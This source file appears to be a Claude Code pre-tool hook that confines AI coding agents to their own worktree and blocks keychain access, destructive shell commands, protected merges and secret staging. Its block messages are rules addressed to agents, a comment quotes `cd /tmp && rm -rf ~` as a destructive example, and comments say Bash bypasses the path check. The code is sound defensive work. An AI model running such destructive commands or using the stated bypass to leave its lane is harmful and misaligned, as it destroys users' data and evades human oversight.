 *  worktree in the repo the work actually belongs to. Committing into a repo the work does not belong
 *  to is called out explicitly because it is the improvisation that was actually observed, and it
 *  looks locally reasonable at the moment an agent reaches for it. */
export function outsideWorktreeMessage(target, callerRoot) {
  return (
    `Blocked: ${target} is outside this agent's worktree (${callerRoot}).\n` +
    "Edit only files inside your worktree. If the file you are producing genuinely belongs somewhere\n" +
    "else, hand it off rather than reaching across:\n" +
    "  1. Stage it for the human — write it into your session scratchpad\n" +
    "     (/tmp/claude-<uid>/<session>/<uuid>/scratchpad/, which this guard allows) and say in chat\n" +
    "     where you put it and where it should go. Nothing is lost and nobody has to guess.\n" +
    "  2. Ask for a worktree in the repo it belongs to, and do the work there — that is the only path\n" +
    "     that can open a PR from that repo.\n" +
    "Do NOT commit it into a repo it does not belong to just because that repo is writable: it buries\n" +
    "the deliverable somewhere nobody is reviewing, and a checkout with no remote cannot ship it at all.\n"
  );
}

/** True iff `target` resolves into a Claude Code SESSION SCRATCHPAD directory — the harness-sanctioned
 *  location the Claude Code system prompt designates for ALL temporary files (helper scripts, PR-body
 *  text, intermediate data). Its shape is `/private/tmp/claude-<uid>/<session>/<uuid>/scratchpad/...`
 *  (macOS `/tmp` symlinks to `/private/tmp`, so a canonicalized target usually reads `/private/tmp`;
 *  Linux keeps `/tmp`). Without this carve-out the containment check blocks the scratchpad (it lives
 *  outside every worktree), forcing agents into clumsy Bash heredocs.
 *
 *  Two conditions, BOTH required, keep this from re-opening the very thing the guard exists to stop:
 *    (a) the resolved path sits under a uid-scoped temp root — `/tmp/claude-*` or
 *        `/private/tmp/claude-*` — never all of `/tmp`; and
 *    (b) `scratchpad` sits at the DOCUMENTED depth `claude-<uid>/<slug>/<uuid>/scratchpad` (parts[3])
 *        AND none of its ancestor segments (parts[0..2]) is a git worktree root (carries a `.git` entry).
 *  Condition (b) is load-bearing: agent WORKTREES are also created under `/private/tmp/claude-*`
 *  (e.g. `/private/tmp/claude-501/wt-foo`), so admitting a `scratchpad` segment by depth alone would let
 *  one agent edit a `scratchpad`-named dir nested inside ANOTHER agent's worktree (…/wt-foo/docs/scratchpad/x,
 *  which also lands on parts[3]) — precisely the guard's job to prevent. A git worktree always carries a
 *  `.git` entry at its root and a session temp root never does, so the `.git`-ancestor check is what
 *  distinguishes the two: it admits the real session scratchpad without admitting any sibling worktree.
 *
 *  Scope note: this is uid-scoped, NOT session-scoped — `/private/tmp/claude-<uid>` is shared by every
 *  concurrent agent under that uid, so the carve-out does not stop one agent writing into another's
 *  correctly-shaped scratchpad. That is an accepted trade-off: the file header states this is a
 *  best-effort guardrail against a well-behaved agent ACCIDENTALLY leaving its lane, not a security
 *  sandbox (Bash bypasses it entirely), and a well-behaved agent only ever targets its OWN scratchpad.
 *
 *  Symlink-safe: the target is canonicalized through symlinks FIRST (same realResolve machinery as the
 *  containment / note-dir checks), so a symlink planted inside a scratchpad that points at a worktree
 *  resolves OUT of the scratchpad and is rejected. Fails closed (false) on any unresolvable path. */
export function isAllowlistedScratchpad(target) {
  if (typeof target !== "string" || target.length === 0) return false;
  const t = realResolve(isAbsolute(target) ? target : `${process.cwd()}${sep}${target}`);
  if (t === null) return false;
  // Canonicalize the temp bases too, so macOS `/tmp` (a symlink to /private/tmp) and the literal
  // `/private/tmp` both compare against the same resolved root.
  for (const base of ["/private/tmp", "/tmp"]) {
    const rb = realResolve(base);
    if (rb === null) continue;
    const rel = relative(rb, t);
    if (rel === "" || rel.startsWith("..")) continue; // target not under this temp base
    const parts = rel.split(sep);
    // (a) first segment beneath the temp base must be a uid session root `claude-*` …
    if (!parts[0].startsWith("claude-")) continue;
    // … and (b) `scratchpad` must sit at the DOCUMENTED depth — `claude-<uid>/<slug>/<uuid>/scratchpad`,
    // i.e. EXACTLY parts[3] — never merely present at some deeper segment.
    if (parts.length >= 4 && parts[3] === "scratchpad") {
      // Depth ALONE cannot tell a session temp root from a git worktree: a sibling worktree with a
      // `docs/scratchpad` subdir also lands `scratchpad` on parts[3] (…/claude-501/wt-victim/docs/scratchpad).
      // A git worktree ALWAYS carries a `.git` entry at its root; a session temp root NEVER does. So reject
      // the match if any ancestor segment (parts[0..2]) is a checkout root — that admits the real scratchpad
      // WITHOUT admitting a `scratchpad` dir nested anywhere inside a sibling worktree. An lstat error (a
      // not-yet-existing ancestor) means "not a worktree here" and is skipped; a real worktree always exists.
      let acc = rb;
      let insideWorktree = false;
      for (let i = 0; i < 3; i++) {
        acc = `${acc}${sep}${parts[i]}`;
        try {
          lstatSync(`${acc}${sep}.git`);
          insideWorktree = true;
          break;
        } catch {
          // no `.git` at this level (or unreadable) — keep walking down the ancestry.
        }
      }
      if (!insideWorktree) return true;
    }
  }
  return false;
}

/** True iff target resolves into one of the two NARROW append-only per-agent note-dir classes,
 *  relative to ONE Claude config root: `<root>/plans/` and `<root>/projects/<any>/memory/`.
 *  Shared by both roots isAllowlistedNoteDir consults; see that docstring for the rationale. */
function isUnderNoteRoot(claudeRoot, target) {
  // (1) Plan files: anywhere at/under <root>/plans/ (reuse the symlink-safe isInside).
  if (isInside(`${claudeRoot}${sep}plans`, target)) return true;
  // (2) Per-agent memory: <root>/projects/<anything>/memory/ and descendants. We cannot
  // express the <anything> wildcard through one isInside root, so canonicalize both the projects
  // root and the target, confirm the target is inside projects/, then require the resolved path to
  // be <projectId>/memory[/...]. Canonicalizing the target FIRST is what makes this symlink-safe:
  // an escaping symlink resolves OUT of projectsRoot and is rejected below.
  const projectsRoot = realResolve(`${claudeRoot}${sep}projects`);
  const t = realResolve(isAbsolute(target) ? target : `${process.cwd()}${sep}${target}`);
  if (projectsRoot === null || t === null) return false;
  const rel = relative(projectsRoot, t);
  if (rel === "" || rel.startsWith("..")) return false; // not inside projects/
  const parts = rel.split(sep);
  // parts[0] = the project id; the very next segment must be the memory dir itself.
  return parts.length >= 2 && parts[1] === "memory";
}

/** True iff target resolves into one of the two NARROW append-only per-agent note dirs we allow
 *  writes to even though they live outside every worktree by design (item 1j):
 *    - <config>/plans/                  plan files, and
 *    - <config>/projects/<any>/memory/  per-agent cross-session memory.
 *  These are append-only NOTES, not code, so allowing them does not undermine the guard job of
 *  stopping an agent editing another agent code, and the header above already states this is
 *  "NOT a security sandbox". Both checks canonicalize through symlinks via the same
 *  realResolve/isInside machinery the containment check uses, so a symlink planted inside an
 *  allow-listed dir that points elsewhere does NOT tunnel a write out: the RESOLVED target simply
 *  will not be inside the allow-listed root. Kept deliberately narrow: ONLY these two dir classes,
 *  never all of the config root. Fails closed (false) on any unresolvable path.
 *
 *  `<config>` is TWO roots, not one, and that is the whole point of `configDir` (sparkle-3moh0):
 *  the harness reads `$CLAUDE_CONFIG_DIR` when it is set and only falls back to `$HOME/.claude`
 *  otherwise — and Sparkle ALWAYS sets it, to the chosen account's dir (see claude.rs). So an
 *  agent the app spawned is handed a plan path under the ACCOUNT dir, which a `$HOME/.claude`-only
 *  allow-list blocks. That made plan mode unusable in an app-managed worktree: the one file plan
 *  mode permits editing could not be written, so ExitPlanMode had nothing to show. We check both
 *  roots because the fallback still applies whenever the variable is unset, and a hook process can
 *  inherit an env that differs from the session that wrote the notes. An empty or relative
 *  `configDir` is IGNORED (empty is the harness's own "unset" sentinel; a relative root would be
 *  cwd-dependent, hence unpredictable), leaving the `$HOME/.claude` behaviour unchanged. */
export function isAllowlistedNoteDir(homeDir, target, configDir) {
  if (typeof homeDir !== "string" || homeDir.length === 0) return false;
  if (typeof target !== "string" || target.length === 0) return false;
  if (isUnderNoteRoot(`${homeDir}${sep}.claude`, target)) return true;
  if (typeof configDir !== "string" || configDir.length === 0) return false;
  if (!isAbsolute(configDir)) return false;
  return isUnderNoteRoot(configDir, target);
}

/** Resolve the git worktree root that CONTAINS `dir`, via `git rev-parse --show-toplevel` run with
 *  `-C dir` so a linked worktree resolves to ITS OWN root (not the repo's main checkout). Returns the
 *  trimmed toplevel path, or null when `dir` isn't inside a git work tree or git isn't on PATH. stderr
 *  is silenced (git prints "not a git repository" there) and any spawn failure is swallowed → null. */
function gitToplevel(dir) {
  try {
    const out = execFileSync("git", ["-C", dir, "rev-parse", "--show-toplevel"], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"],
    });
    const top = out.trim();
    return top.length > 0 ? top : null;
  } catch {
    return null;
  }
}

/** The worktree the CALLER is actually operating in. The guard is installed with ONE baked-in root
 *  (argv[2] — the worktree it was installed for), but the same hook runs for sub-agents / pooled
 *  worktrees whose real cwd is a DIFFERENT worktree, so keying off the baked-in root alone wrongly
 *  blocks an agent editing its OWN (non-install-root) worktree. We derive the caller's worktree from
 *  the tool call's `cwd` (Claude Code puts the session's working dir in the hook payload) via git
 *  worktree semantics, falling back to `installRoot` when cwd isn't in a git work tree (or git is
 *  unavailable) — so a misconfigured/repo-less caller is no MORE permissive than before. This keeps the
 *  check worktree-RELATIVE: the returned root is fed to isInside(), which allows edits inside the
 *  caller's own worktree and still DENIES edits reaching into a different worktree. `resolveToplevel`
 *  is injectable so tests can exercise the logic without a real git repo. */
export function callerWorktreeRoot(installRoot, cwd, resolveToplevel = gitToplevel) {
  if (typeof cwd === "string" && cwd.length > 0) {
    const top = resolveToplevel(cwd);
    if (typeof top === "string" && top.length > 0) return top;
  }
  return installRoot;
}

async function main() {
  const root = process.argv[2];
  if (!root) process.exit(0); // misconfigured guard must not block work
  let raw = "";
  for await (const chunk of process.stdin) raw += chunk;
  let payload;
  try {
    payload = JSON.parse(raw);
  } catch {
    process.exit(0);
  }
  const input = payload?.tool_input ?? {};
  // Keychain guard (sparkle-0ezz): a Bash command that runs the `security` CLI against the
  // ai.sparkle.desktop keychain item is refused outright — exit 2 blocks the tool call before it runs.
  if (blocksKeychainCommand(input.command)) {
    process.stderr.write(
      "Blocked: refusing to run the macOS `security` CLI against the ai.sparkle.desktop keychain. " +
        "Sparkle stores its desktop-token / trial-device-token there and reads them in-process via " +
        "keyring; shelling out to `security` triggers a scary OS confidential-information prompt and " +
        "is never necessary. Do not touch this keychain item.\n",
    );
    process.exit(2); // exit code 2 → Claude Code blocks the tool call
  }
  // Destructive-command guard: the brakes that make `bypassPermissions` safe. Sparkle turns the
  // per-command approval prompt OFF in every managed worktree, so this is the layer that refuses
  // the handful of unambiguously destructive commands — and, unlike `permissions.deny`, it sees
  // inside a compound (`cd /tmp && rm -rf ~`).
  //
  // The try/catch mirrors the secret-staging one below and is a blast-radius limit, NOT a policy:
  // this predicate runs on EVERY Bash command, so a parser bug that exited 2 would block every
  // shell command for every agent — a total outage. A crash is a BUG, not evidence about the
  // command; degrade this one guard rather than the whole hook. The predicate is pure (no repo, no
  // filesystem), so there is no "could not determine" case for it to fail open on.
  let destructive = null;
  try {
    destructive = blocksDestructiveCommand(input.command);
  } catch {
    destructive = null;
  }
  if (destructive !== null) {
    process.stderr.write(destructiveCommandMessage(destructive));
    process.exit(2); // exit code 2 → Claude Code blocks the tool call
  }
  // Merge-policy guard (contract §7): `gh pr merge` in a worktree whose resolved policy says the
  // repo is merge-protected. Unlike the two guards above this one is CONDITIONAL — the same command
  // is the sanctioned path in the owner's own repo — so the verdict comes from
  // `<worktree>/.sparkle/merge-policy.json`, written per worktree by Rust. Absent file → no opinion.
  let protectedMerge = null;
  try {
    protectedMerge = blocksProtectedMerge(input.command, payload?.cwd);
  } catch {
    // A crash here is a BUG, not evidence about the command — but unlike the two guards above, this
    // predicate only ever reaches its filesystem work on a command that already names `gh pr merge`,
    // so failing CLOSED cannot cause the fleet-wide outage that motivated their fail-open catches.
    // The act it protects is irreversible, so a crash on a merge-shaped command blocks.
    const raw = typeof input.command === "string" ? input.command : "";
    protectedMerge = /\bgh\b[\s\S]*\bpr\b[\s\S]*\bmerge\b/.test(raw)
      ? {
          kind: "unreadable",
          file: null,
          slug: null,
          why: "the merge-policy guard crashed while evaluating this command",
          remedy: null,
        }
      : null;
  }
  if (protectedMerge !== null) {
    process.stderr.write(protectedMergeMessage(protectedMerge));
    process.exit(2); // exit code 2 → Claude Code blocks the tool call
  }
  // Secret-staging guard: a `git add` / `git commit` that would put credential material into git is
  // refused. `payload.cwd` is the session's working directory, which is what the Bash command runs
  // in — it is the directory the CASE 2 repo probe inspects. CASE 2 fails OPEN when that probe can't
  // run; CASE 1 needs no repo at all and stays strict (see the asymmetry note on the predicate).
  //
  // The try/catch is NOT the fail-open decision documented on the predicate — it is a blast-radius
  // limit, and it is the one place in this file where an exception must NOT reach the top-level
  // `.catch(() => process.exit(2))`. Two reasons. (1) This guard runs on EVERY Bash command and is by
  // far the largest code in the hook (a hand-rolled lexer, a statSync, three execFileSync calls); a
  // parser bug that exited 2 would block every shell command for every agent — a total outage, where
  // failing open merely restores the status quo that existed before this guard shipped. (2) This
  // block sits ABOVE the file-path containment check, so letting a throw exit here would take the
  // pre-existing worktree guard down with it for that call. A crash is a BUG, not evidence about the
  // repo; degrade this one guard rather than the whole hook.
  let secretStaging = null;
  try {
    secretStaging = blocksSecretStaging(input.command, payload?.cwd);
  } catch {
    secretStaging = null;
  }
  if (secretStaging !== null) {
    process.stderr.write(secretStagingMessage(secretStaging));
    process.exit(2); // exit code 2 → Claude Code blocks the tool call
  }
  const target = input.file_path ?? input.notebook_path;
  if (!target) process.exit(0); // nothing path-like to guard
  // Worktree-RELATIVE containment: allow edits inside WHICHEVER worktree the caller is operating in
  // (derived from the tool call's cwd), not just the single worktree this hook was installed for.
  // Falls back to the install-time `root` when cwd isn't in a git work tree.
  const callerRoot = callerWorktreeRoot(root, payload?.cwd);
  // Fail CLOSED on any unexpected error: only exit code 2 blocks the tool, so an exception that
  // escaped here would let the write proceed (fail open). Treat "couldn't decide" as "block".
  let inside;
  try {
    inside = isInside(callerRoot, target);
  } catch {
    inside = false;
  }
  if (inside) process.exit(0);
  // Narrow allow-list (item 1j): permit writes to the two append-only per-agent note dirs that
  // live OUTSIDE every worktree by design (plan files and cross-session memory) so an agent can
  // record what it learned for the next agent. Safe because these are notes, not code, and
  // isAllowlistedNoteDir canonicalizes through symlinks (same fail-closed machinery as above).
  // `$CLAUDE_CONFIG_DIR` is passed because the harness honours it over `$HOME/.claude`, and Sparkle
  // always sets it to the account dir — without it the app's own agents cannot write their assigned
  // plan file at all (sparkle-3moh0). The hook inherits the variable from the `claude` process.
  let allowedNoteDir = false;
  try {
    allowedNoteDir = isAllowlistedNoteDir(homedir(), target, process.env.CLAUDE_CONFIG_DIR);
  } catch {
    allowedNoteDir = false;
  }
  if (allowedNoteDir) process.exit(0);
  // Session scratchpad allow-list: the Claude Code system prompt designates a per-session scratchpad
  // dir (`/private/tmp`|`/tmp`/claude-*/.../scratchpad) for ALL temp files — helper scripts, PR-body
  // text. It lives outside every worktree, so the containment check above blocks it, pushing agents
  // into clumsy Bash heredocs. Permit it: a scratchpad is harness-sanctioned and is NOT a repo (see
  // isAllowlistedScratchpad — `scratchpad` is required at the DOCUMENTED depth parts[3] AND no ancestor
  // may be a git worktree root (`.git` check), which keeps this from admitting sibling agent worktrees
  // also created under /private/tmp/claude-*). uid-scoped, not session-scoped (accepted trade-off — see
  // the predicate docstring). Symlink-safe; fails closed.
  let allowedScratchpad = false;
  try {
    allowedScratchpad = isAllowlistedScratchpad(target);
  } catch {
    allowedScratchpad = false;
  }
  if (allowedScratchpad) process.exit(0);
  process.stderr.write(outsideWorktreeMessage(target, callerRoot));
  process.exit(2); // exit code 2 → Claude Code blocks the tool call
}

// Only run main() when executed as a script, not when imported by a test.
// The top-level `.catch` is the real fail-closed backstop: ANY uncaught error anywhere in main()
// — a stdin stream error, a future code path, etc. — exits 2 (block) rather than escaping as an
// unhandled rejection (which exits 1, and since only exit 2 blocks the tool, would fail OPEN).
if (process.argv[1] && process.argv[1].endsWith("worktree-guard.mjs")) {
  main().catch(() => process.exit(2));
}
